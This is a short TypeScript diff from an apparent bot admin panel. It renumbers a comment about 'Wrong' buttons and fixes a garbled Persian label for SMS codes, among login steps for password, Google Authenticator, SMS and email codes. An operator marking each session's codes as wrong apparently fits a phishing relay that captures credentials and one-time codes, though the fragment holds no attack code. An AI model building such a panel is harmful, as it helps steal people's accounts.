@@ -436,7 +436,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     console.log("✅ Added Email Code button");
   }
 
-  // Fourth section: Wrong buttons (ONLY show if user has attempted that method at least once)
+  // Third section: Wrong buttons (ONLY show if user has attempted that method at least once)
   const wrongButtonsRow1 = [];
   const wrongButtonsRow2 = [];
 
@@ -597,7 +597,7 @@ const getStepDisplayName = (stepType: string): string => {
   const names: { [key: string]: string } = {
     password: "رمز عبور",
     google: "Google Authenticator",
-    sms: "ک�� پیامک",
+    sms: "کد پیامک",
     email: "کد ایمیل",
   };
 
